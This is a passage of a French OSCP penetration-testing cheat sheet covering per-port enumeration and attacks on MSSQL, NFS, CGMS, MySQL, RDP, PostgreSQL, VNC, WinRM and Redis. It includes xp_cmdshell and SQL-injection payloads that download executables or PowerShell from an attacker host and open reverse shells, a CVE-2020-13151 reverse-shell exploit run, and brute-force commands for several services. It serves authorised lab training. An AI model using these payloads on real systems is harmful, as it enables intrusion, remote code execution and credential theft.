nmap -sV -p 1433 --script ms-sql-info 192.0.2.10

```

<p class="oscp-command-note">NetExec MSSQL : vérifier les identifiants et demander whoami sur le serveur uniquement si les droits d'exécution le permettent.</p>

```bash
# Avec NetExec MSSQL, -x demande l'exécution d'une commande système, pas d'une requête SQL
nxc mssql 192.0.2.10 -d exemple.local -u utilisateur -p 'MotDePasseTest' -x 'whoami'

# Lister les bases MSSQL via une connexion SQL dédiée (la commande -x précédente n'est pas adaptée)
# Après connexion avec impacket-mssqlclient, saisir : SELECT name FROM sys.databases;

```

<p class="oscp-command-note">sqsh : client SQL Server en terminal ; -P expose le mot de passe dans la ligne de commande, préférer une saisie sécurisée.</p>

```bash
# Se connecter à MSSQL avec sqsh sous Linux (client installé requis)
sqsh -S <target_ip> -U <username> -P <password>

# Se connecter avec un compte de domaine et sélectionner une base (si sqsh est installé)
sqsh -S <target_ip> -U <domain>\\<username> -P <password> -D <database>

```

<p class="oscp-command-note">SQL Server : activer xp_cmdshell modifie la configuration globale et nécessite des privilèges élevés ; rétablir la configuration initiale après le test.</p>

```sql
-- Activer les options avancées et xp_cmdshell (modifie la configuration du serveur ; droits élevés requis)
EXEC SP_CONFIGURE 'show advanced options', 1;
RECONFIGURE;
GO

EXEC SP_CONFIGURE 'xp_cmdshell', 1;
RECONFIGURE;
GO

-- Vérifier l'exécution de commandes système via xp_cmdshell avec une action de lecture seule
EXEC xp_cmdshell 'whoami';
GO

-- Exemple de téléchargement distant : à réserver au laboratoire autorisé ; vérifier le fichier avant exécution
EXEC xp_cmdshell 'powershell "Invoke-WebRequest -Uri http://<attacker_ip>:<port>/reverse.exe -OutFile c:\\Users\\Public\\reverse.exe"';
GO

EXEC xp_cmdshell 'c:\\Users\\Public\\reverse.exe';
GO

```

```sql
-- Charge SQL illustrative liée à xp_cmdshell : dépend du contexte d'injection et ne s'exécute pas comme une requête SQL autonome
test'; EXEC master.dbo.xp_cmdshell 'powershell.exe -c "IEX(New-Object System.Net.WebClient).DownloadString(''http://<attacker_ip>:<port>/powercat.ps1'');powercat -c <attacker_ip> -p <port> -e powershell"';--

```

```sql
-- SQL Server : lister les bases visibles pour le compte courant
SELECT name FROM sys.databases;
                
-- SQL Server : lister les tables et vues accessibles via INFORMATION_SCHEMA
SELECT * FROM information_schema.tables;

-- SQL Server : lire les lignes d'une table autorisée (remplacer le nom de table)
SELECT * FROM <table_name>;

-- SQL Server : filtrer les lignes avec LIKE (adapter la colonne et le motif)
SELECT * FROM <table_name> WHERE <column_name> LIKE '%<search_term>%';

-- SQL Server : insérer une ligne ; opération d'écriture à éviter hors laboratoire
INSERT INTO <table_name> (<column1>, <column2>) VALUES ('<value1>', '<value2>');

-- SQL Server : modifier des lignes ; définir une condition WHERE précise avant exécution
UPDATE <table_name> SET <column_name> = '<new_value>' WHERE <condition>;

-- SQL Server : supprimer des lignes ; opération destructive à réserver aux données de test
DELETE FROM <table_name> WHERE <condition>;

```

#### Client SQL Server avec authentification Windows

Vérifier le type d'authentification demandé par l'instance MSSQL.

<p class="oscp-command-note">Impacket mssqlclient : utiliser -windows-auth pour l'authentification intégrée Windows avec un compte de domaine.</p>

```bash
impacket-mssqlclient '<DOMAINE>/<UTILISATEUR>:<MOT_DE_PASSE>@<IP_CIBLE>' -windows-auth
```

### 2049: NFS

<p class="oscp-command-note">Nmap NFS : consulter les exports, listes de fichiers et statistiques accessibles via les scripts NSE NFS.</p>

```bash
nmap -sV -p 111,2049 --script nfs-showmount,nfs-ls,nfs-statfs <IP_CIBLE>

```

<p class="oscp-command-note">NFS : interroger mountd pour les exports (-e) et montages déclarés (-a), si le serveur les expose.</p>

```bash
# Afficher les partages NFS de la cible
showmount -e <IP_CIBLE>

# Afficher les montages NFS annoncés par le serveur (si mountd les expose)
showmount -a <IP_CIBLE>

```

<p class="oscp-command-note">Linux NFS : monter un export autorisé en lecture seule avec sudo ; vers=3 force NFSv3 et peut échouer sur un serveur NFSv4 uniquement.</p>

```bash
# Créer un répertoire local pour monter le partage NFS
mkdir -p /mnt/partage_nfs

# Monter le partage NFSv3 en lecture seule (les exports NFSv4 peuvent nécessiter une autre méthode)
sudo mount -t nfs -o ro,vers=3 <IP_CIBLE>:/export/partage /mnt/partage_nfs

```

### 3003: CGMS (possible)

<p class="oscp-command-note">TCP 3003 : ouvrir une connexion Netcat ; identifier le protocole avant d'essayer des commandes internes.</p>

```text
# Depuis un terminal : ouvrir une connexion TCP
nc -nv 192.0.2.10 3003

# Dans la session, uniquement si le service accepte ces commandes :
help
version

```

<p class="oscp-command-note">CGMS : exemple historique de téléchargement d'un script tiers ; vérifier la source, le CVE et les arguments avant tout usage en laboratoire.</p>

```bash
# Télécharger le script tiers uniquement après vérification de son contenu
wget https://raw.githubusercontent.com/b4ny4n/CVE-2020-13151/master/cve2020-13151.py

# Exemple historique : vérifier la compatibilité du script et des options avant exécution
python3 cve2020-13151.py --ahost=<target_ip> --aport=3000 --pythonshell --lhost=<local_ip> --lport=443

# Démarrer l'écouteur sur une machine de laboratoire autorisée avant le test
nc -nlvp 443

```

<p class="oscp-command-note">Commandes internes CGMS : à saisir dans son interface après connexion, pas dans PowerShell.</p>

```text
bins
build
build_os
build_time
cluster-name
config-get
config-set
digests
dump-cluster
dump-fabric
dump-hb
dump-hlc
dump-migrates
dump-msgs
dump-rw
dump-si
dump-skew
dump-wb-summary
eviction-reset
feature-key
get-config
get-sl
health-outliers
health-stats
histogram
jem-stats
jobs
latencies
log
log-set
log-message
logs
mcast
mesh
name
namespace
namespaces
node
physical-devices
quiesce
quiesce-undo
racks
recluster
revive
roster
roster-set
service
services
services-alumni
services-alumni-reset
set-config
set-log
sets
show-devices
sindex
sindex-create
sindex-delete
sindex-histogram
statistics
status
tip
tip-clear
truncate
truncate-namespace
truncate-namespace-undo
truncate-undo
version

```

### 3306 : MySQL / MariaDB

Examiner les connexions, la configuration et les requêtes de la base de données.

<p class="oscp-command-note">Nmap MySQL : relever la version et les variables du serveur ; aucun script d'extraction de hash n'est exécuté.</p>

```bash
nmap -sV -p 3306 --script mysql-info,mysql-variables <IP_CIBLE>

```

<p class="oscp-command-note">Kali : lister les bases MySQL accessibles. `-p` demande le mot de passe.</p>

```bash
mysql -h <IP_CIBLE> -u <UTILISATEUR> -p -e 'SHOW DATABASES;'

```

<p class="oscp-command-note">Hydra MySQL : tester des identifiants autorisés sur TCP 3306 ; attention au verrouillage.</p>

```bash
# Tester des identifiants MySQL uniquement avec autorisation explicite (risque de verrouillage)
hydra -l <username> -P <password_list> -s 3306 -vV <IP> mysql

```

<p class="oscp-command-note">MySQL : se connecter à une base existante. `-p` demande le mot de passe.</p>

```bash
mysql -h <IP_CIBLE> -u <UTILISATEUR> -p <BASE_DE_DONNEES>

```

<p class="oscp-command-note">MySQL : lister les bases et les tables, puis lire 10 lignes. Adapter les noms.</p>

```sql
SHOW DATABASES;

-- Remplacer oscp_lab par une base existante et autorisée
USE oscp_lab;

SHOW TABLES;

-- Remplacer exemple par une table réellement présente
DESCRIBE exemple;

-- Limiter la lecture aux dix premières lignes
SELECT * FROM exemple LIMIT 10;

```

```sql
-- Lister les comptes MySQL si la lecture de mysql.user est autorisée
SELECT user, host FROM mysql.user;

-- Afficher les privilèges du compte courant, sans les modifier
SHOW GRANTS FOR CURRENT_USER();

```

<p class="oscp-command-note">MySQL : lire un fichier sur le serveur, pas sur Kali. Nécessite le droit `FILE` et un chemin autorisé.</p>

```sql
-- Lire un fichier texte de démonstration sur le serveur Windows, s'il existe et est autorisé
SELECT LOAD_FILE('C:/xampp/htdocs/test.txt');
```

<p class="oscp-command-note">Windows : afficher les permissions du fichier local avec `icacls`.</p>

```cmd
icacls "C:\xampp\htdocs\test.txt"
```

### 3389: RDP

<p class="oscp-command-note">Nmap : relever la sécurité RDP et les informations NTLM disponibles.</p>

```bash
nmap -sV -p 3389 --script rdp-enum-encryption,rdp-ntlm-info <IP_CIBLE>

```

<p class="oscp-command-note">Hydra RDP : tester des comptes autorisés ; limiter les essais pour éviter le verrouillage.</p>

```bash
hydra -L <user_list> -P <password_list> -s 3389 rdp://<IP>

```

<p class="oscp-command-note">RDP : tester des identifiants de laboratoire avec Crowbar ou NetExec ; attention aux verrouillages de comptes.</p>

```bash
# Crowbar : tester des identifiants RDP autorisés ; risque de verrouillage des comptes
crowbar -b rdp -s <target_ip>/32 -U users.txt -C rockyou.txt

# NetExec : vérifier des identifiants RDP autorisés ; limiter les essais
nxc rdp 192.0.2.10 -u utilisateurs.txt -p mots_de_passe.txt

```

<p class="oscp-command-note">Kali : se connecter en RDP avec FreeRDP (`xfreerdp` ou `xfreerdp3` selon la version).</p>

```bash
# FreeRDP 2.x : ouvrir une session RDP ; vérifier le binaire disponible (xfreerdp ou xfreerdp3)
xfreerdp /v:192.0.2.10 /u:utilisateur /cert:ignore /size:1600x1000

# Partager un répertoire local existant avec le bureau distant (FreeRDP 2.x)
# Le dossier /home/kali/partage doit exister sur Kali avant la connexion
xfreerdp /v:192.0.2.10 /u:utilisateur /cert:ignore /drive:partage,/home/kali/partage

# Activer le presse-papiers et régler la résolution (FreeRDP 2.x)
xfreerdp /v:192.0.2.10 /u:utilisateur /cert:ignore +clipboard /size:1920x1080

# Alternative historique : rdesktop ; éviter -p pour ne pas exposer le mot de passe dans les processus
rdesktop -u utilisateur -g 1920x1080 <IP_CIBLE>

# Variante rdesktop sans utilisateur précisé ; la demande d'identifiants dépend du serveur
rdesktop <IP_CIBLE>

```

#### Vérification d'un compte RDP

Tester un compte de laboratoire sur le service RDP si les règles d'audit autorisent l'authentification.

<p class="oscp-command-note">RDP : vérifier l'authentification d'un compte de test avec NetExec sur une cible autorisée.</p>

```bash
nxc rdp <IP_CIBLE> -u '<UTILISATEUR>' -p '<MOT_DE_PASSE>'
```

### 5432, 5433: PostgreSQL

Examiner les connexions, la configuration et les requêtes de la base de données.

<p class="oscp-command-note">Nmap PostgreSQL : identifier les services sur TCP 5432 et 5433 ; aucun script NSE n'est lancé ici.</p>

```bash
nmap -sV -p 5432,5433 192.0.2.10

```

<p class="oscp-command-note">Hydra PostgreSQL : tester des comptes autorisés sur TCP 5432 ; attention au verrouillage.</p>

```bash
hydra -L utilisateurs.txt -P mots_de_passe.txt -s 5432 192.0.2.10 postgres

```

<p class="oscp-command-note">Kali : lister les bases PostgreSQL avec `psql`. Client et identifiants requis.</p>

```bash
psql -h <IP_CIBLE> -U <UTILISATEUR> -d postgres -c '\l'

```

```bash
# -W : demander explicitement le mot de passe PostgreSQL
psql -h <IP_CIBLE> -p 5432 -U <UTILISATEUR> -W

```

<p class="oscp-command-note">PostgreSQL : relever la version du serveur avant de rechercher une vulnérabilité. Ne pas exécuter de script tiers sans avoir vérifié son origine, sa syntaxe et les conditions de la CVE.</p>

```sql
-- Dans psql : afficher la version exacte du serveur PostgreSQL
SELECT version();

-- Afficher l'identité et la base de la session courante
SELECT current_user, current_database();
```

<p class="oscp-command-note">PostgreSQL : `COPY FROM PROGRAM` lance `id` **sur le serveur de base de données**, pas sur Kali. Il exige les privilèges superutilisateur ou l'appartenance au rôle `pg_execute_server_program`. L'exemple supprime une table nommée `cmd_exec` si elle existe : utiliser exclusivement une base de laboratoire dédiée.</p>

```sql
-- Démonstration SQL PostgreSQL : COPY FROM PROGRAM exige des privilèges élevés  
DROP TABLE IF EXISTS cmd_exec;  
CREATE TABLE cmd_exec(cmd_output text);  
COPY cmd_exec FROM PROGRAM 'id';  
SELECT * FROM cmd_exec;  
DROP TABLE IF EXISTS cmd_exec;

```

<p class="oscp-command-note">Dans `psql` : commandes `\l`, `\c`, `\dt` et `\d`, sans point-virgule.</p>

Dans l'invite `psql`, exécuter les lignes suivantes individuellement : `\l` liste les bases, `\c` change de base, `\dt` liste les tables et `\d` décrit une table. Remplacer les noms entre chevrons.

```text
\l
\c postgres
\c <DB_NAME>
\dt
\d <TABLE_NAME>
\d+ <TABLE_NAME>
```

<p class="oscp-command-note">PostgreSQL : adapter les noms des tables. Écritures réservées à une base de test.</p>

```sql
-- Exemple à adapter à une table existante et autorisée ; remplacer public.users par le schéma et la table réels
SELECT * FROM public.users LIMIT 10;

-- Exemple de filtre : remplacer la colonne et la valeur selon le schéma réel
SELECT * FROM public.users WHERE username = 'utilisateur_test' LIMIT 10;

-- Inventorier les colonnes du schéma public
SELECT table_name, column_name, data_type
FROM information_schema.columns
WHERE table_schema = 'public';

-- Créer une table de démonstration (écriture, laboratoire uniquement)
CREATE TABLE test_table (
    id SERIAL PRIMARY KEY,
    name VARCHAR(100),
    created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
);

-- Insérer une ligne de test
INSERT INTO test_table (name) VALUES ('example_data');

-- Modifier uniquement la ligne de démonstration identifiée par son nom
UPDATE test_table SET name = 'updated_data' WHERE name = 'example_data';

-- Supprimer uniquement la ligne créée pour la démonstration
DELETE FROM test_table WHERE name = 'updated_data';
```

### 5900: VNC (Virtual Network Computing)

<p class="oscp-command-note">Nmap VNC : relever le protocole RFB et les mécanismes d'authentification annoncés sur TCP 5900.</p>

```bash
nmap -sV -p 5900 --script vnc-info <IP_CIBLE>

```

<p class="oscp-command-note">VNC : `::5900` indique le port TCP ; `:0` indique l'écran 0.</p>

```bash
# TigerVNC : ::5900 désigne le port TCP 5900, tandis que :0 désigne l'écran VNC 0
vncviewer <IP_CIBLE>::5900

# Utiliser un fichier de mot de passe VNC existant ; ne pas confondre ce fichier avec un mot de passe en clair
vncviewer -passwd /chemin/vers/fichier_mot_de_passe <IP_CIBLE>::5900

```

<p class="oscp-command-note">Hydra VNC : tester une liste de mots de passe dans le laboratoire ; le protocole VNC classique n'utilise pas de nom d'utilisateur.</p>

```bash
hydra -P mots_de_passe.txt vnc://192.0.2.10

```

<p class="oscp-command-note">VNC : exemples fictifs de mots de passe faibles ; aucune authentification réussie n'est implicite.</p>

```text
# Exemples fictifs de mots de passe faibles ; ne pas les considérer comme des identifiants découverts
(aucun mot de passe)
vnc
1234

```

```text
1. Examiner les fichiers accessibles selon les droits de la session
2. Vérifier les commandes autorisées
3. Capturer l'écran uniquement avec autorisation
4. Manipuler des fichiers de test uniquement

```

### 5985, 5986: WinRM

Observer les permissions et la configuration de Windows.

<p class="oscp-command-note">WinRM : identifier le service sur les ports habituels HTTP 5985 et HTTPS 5986 avec Nmap. Un port ouvert ne garantit ni une configuration WinRM utilisable ni les permissions de connexion distante.</p>

```bash
nmap -sV -p 5985,5986 <IP_CIBLE>

```

<p class="oscp-command-note">NetExec WinRM : vérifier l'authentification d'un compte autorisé ; la connexion nécessite un service et des droits adaptés.</p>

```bash
nxc winrm 192.0.2.10 -u utilisateur -p 'MotDePasseTest'

```

```powershell
# Windows PowerShell : ouvrir une session distante WinRM ; les règles TrustedHosts/Kerberos dépendent du contexte
Enter-PSSession -ComputerName 192.0.2.10 -Credential (Get-Credential)

```

<p class="oscp-command-note">Evil-WinRM : ouvrir depuis Kali une session PowerShell distante si le compte possède les droits WinRM requis.</p>

```bash
# Kali : ouvrir une session WinRM via HTTP/5985 avec Evil-WinRM ; compte et droits adaptés requis
evil-winrm -i 192.0.2.10 -u utilisateur -p 'MotDePasseTest'

```

#### Informations WinRM

Identifier si le point de terminaison WinRM est accessible en HTTP et s'il demande une authentification.

<p class="oscp-command-note">WinRM : tester `/wsman` sur 5985. `401` signifie authentification requise.</p>

```bash
curl -i --max-time 5 http://<IP_CIBLE>:5985/wsman
```

#### Authentification WinRM autorisée

Tester des identifiants fournis pour l'audit sur une seule cible, sans mot de passe en masse.

<p class="oscp-command-note">NetExec WinRM : tester un compte de domaine fourni pour l'audit ; vérifier les droits de connexion distante séparément.</p>

```bash
nxc winrm <IP_CIBLE> -u '<UTILISATEUR>' -p '<MOT_DE_PASSE>' -d '<DOMAINE>'
```

### 6379: Redis

<p class="oscp-command-note">Nmap Redis : consulter redis-info sur TCP 6379 sans tentative d'exécution distante.</p>

```bash
nmap -sV -p 6379 --script redis-info <IP_CIBLE>

```

<p class="oscp-command-note">Redis : `--askpass` demande un mot de passe interactif et évite de l'exposer dans les arguments du processus. Sans mot de passe configuré, utiliser `redis-cli` sans cette option ; les ACL peuvent aussi exiger un nom d'utilisateur.</p>

```bash
redis-cli -h <IP_CIBLE> -p 6379 --askpass

```

<p class="oscp-command-note">Redis : comparer la version retournée par `INFO server` avec les références trouvées par `searchsploit`. Une référence d'exploit ne prouve pas la vulnérabilité de la cible ; `INFO` peut être interdit par les ACL ou exiger une authentification.</p>

```bash
# Rechercher des références publiques à examiner en fonction de la version détectée
searchsploit redis

# Interroger le service avec le client officiel si l'accès est autorisé
redis-cli -h <IP_CIBLE> -p 6379 INFO server
```

<p class="oscp-command-note">Sur Kali : `redis-cli` ouvre une session interactive sur le service Redis. Sans identifiants, le serveur peut refuser les commandes avec `NOAUTH` ; utiliser alors un compte autorisé.</p>

```bash
redis-cli -h <IP_CIBLE> -p 6379
```

<p class="oscp-command-note">Dans l'invite `redis-cli` : `INFO` affiche les informations autorisées ; répéter `SCAN` avec le curseur renvoyé jusqu'à zéro. `SELECT 0` choisit la base 0 (non applicable aux configurations Redis Cluster) ; `CONFIG GET` dépend des ACL. `SET` modifie les données : laboratoire uniquement. Ne pas exécuter `SHUTDOWN`.</p>

```text
INFO
SCAN 0
SELECT 0
GET mykey
CONFIG GET '*'
```

<p class="oscp-command-note">Écriture facultative, uniquement dans une base Redis de test : `SET mykey myvalue` crée ou **écrase** la clé `mykey` si elle existe déjà. Vérifier son absence avant le test.</p>

```text
SET mykey myvalue
GET mykey
```

### Port inconnu

Vérifier les ports et les services de la cible autorisée.

<p class="oscp-command-note">Sur Kali, `nc -nv` ouvre une connexion TCP vers le port indiqué, sans détecter automatiquement le protocole. `-n` désactive la résolution DNS et `-v` affiche les détails. Une connexion réussie ne démontre pas qu'un service applicatif répond correctement.</p>

```bash
# Depuis Kali : établir une connexion TCP vers un port autorisé, sans présumer du protocole
nc -nv <IP_CIBLE> <PORT_TCP>

```

N'envoyer de texte dans la session Netcat qu'après identification du protocole et vérification des commandes qu'il accepte. Un service binaire peut ne pas répondre à des instructions textuelles.

<p class="oscp-command-note">Netcat n'effectue pas d'authentification générique : le format des messages dépend du protocole. Éviter d'envoyer des identifiants ou des commandes `list` sans spécification confirmée.</p>

<p class="oscp-command-note">Identifier d'abord le service avec Nmap, puis consulter la documentation du protocole réellement détecté. Ne pas envoyer de commandes génériques à un service inconnu.</p>

```bash
nmap -sV --version-all -p <PORT_TCP> <IP_CIBLE>
```

#### Détecter si un port parle TLS

Sur un port inconnu, tester TLS seulement après avoir identifié le port et son contexte ; une connexion TLS directe ne convient pas à tous les protocoles.

<p class="oscp-command-note">`openssl s_client` tente une négociation TLS immédiate. Un échec ne prouve pas l'absence de TLS : SMTP, IMAP ou POP3 peuvent nécessiter une négociation STARTTLS avec l'option `-starttls` adaptée. Vérifier le nom d'hôte et le certificat avant de conclure.</p>

```bash
openssl s_client -connect <IP_CIBLE>:<PORT> -brief
```

## Vérifications ciblées des services

Ces contrôles complètent l'inventaire des ports sur les hôtes autorisés. Un résultat NSE est un indice à confirmer ; certains scripts peuvent être intrusifs, vérifier leur catégorie et leur aide avant exécution.

### Nmap : examiner précisément un service

Lire l'aide et les effets du script NSE `smb-ls` avant de l'utiliser sur un partage SMB autorisé. Sans identifiants adaptés, le script peut échouer même si SMB est accessible ; ne pas interpréter ce refus comme l'absence de fichiers.

<p class="oscp-command-note">Nmap NSE : lire l'aide de smb-ls avant le scan SMB ; la présence du script ne garantit pas l'accès aux fichiers.</p>

```bash
nmap --script-help smb-ls
nmap -sV -p 445 --script smb-ls <IP_CIBLE>
```

### Découverte via un proxy TCP

Avec ProxyChains, utiliser `-sT -Pn` pour les connexions TCP ; les sondes SYN/UDP et certaines opérations de découverte ne passent pas par SOCKS. `--top-ports 200` ne garantit pas la découverte de tous les services ouverts.

<p class="oscp-command-note">proxychains4 : scanner en TCP connect (-sT -Pn) ; vérifier d'abord le proxy SOCKS et éviter les scans SYN/UDP via ce chemin.</p>

```bash
proxychains4 -q nmap -sT -Pn -n --unprivileged --top-ports 200 <IP_CIBLE>
```

### NFS : identifier les exports

`showmount -e` interroge le service `mountd` pour les exports NFS. NFSv4 peut être accessible directement sur TCP 2049 sans `mountd` ; l'absence de réponse ne suffit donc pas à exclure NFS.

<p class="oscp-command-note">showmount -e : afficher les exports annoncés par mountd ; l'absence de réponse ne prouve pas l'absence de NFSv4.</p>

```bash
showmount -e <IP_CIBLE>
```

### RPC : examiner les utilisateurs visibles

`rpcclient -U '' -N` tente une session sans mot de passe. `enumdomusers` nécessite des permissions RPC suffisantes ; un refus d'accès ne signifie pas que SMB est fermé ou que le domaine ne contient aucun utilisateur.

<p class="oscp-command-note">rpcclient : -U '' -N tente une session sans mot de passe ; enumdomusers dépend des permissions RPC.</p>

```bash
rpcclient -U '' -N <IP_CIBLE> -c 'enumdomusers'
```

### SNMP : interroger les informations système

Utiliser uniquement une communauté SNMPv2c autorisée. La commande parcourt l'OID `system` de MIB-II ; SNMPv1/v2c n'apporte ni chiffrement ni authentification forte, contrairement aux configurations SNMPv3 adaptées.

<p class="oscp-command-note">snmpwalk : parcourir la branche system (1.3.6.1.2.1.1) avec une communauté SNMPv2c autorisée.</p>

```bash
snmpwalk -v2c -c <COMMUNAUTE> <IP_CIBLE> 1.3.6.1.2.1.1
```

### Redis : rechercher les informations du service

Exécuter le script NSE `redis-info` uniquement sur une cible autorisée. Il peut ne rien retourner si Redis exige une authentification ou si les ACL bloquent `INFO` ; confirmer la version avec un compte autorisé.

<p class="oscp-command-note">Nmap NSE redis-info : relever les informations accessibles sur TCP 6379 ; un échec peut résulter d'une authentification obligatoire.</p>

```bash
nmap -sV -p 6379 --script redis-info <IP_CIBLE>
```

**Référence technique complémentaire :** [Notes OSCP de krovs](https://github.com/krovs/oscp-notes/blob/main/docs/10_info_gathering.md). Cette synthèse conserve la structure de SKILL-ISSUE et reformule les explications.

<!-- notes-krovs-2026 -->

---

Source documentaire : [OSCP+ Cheatsheet d'Emmanuel Solis](https://www.emmanuelsolis.com/oscp.html).

<!-- refined-oscp -->
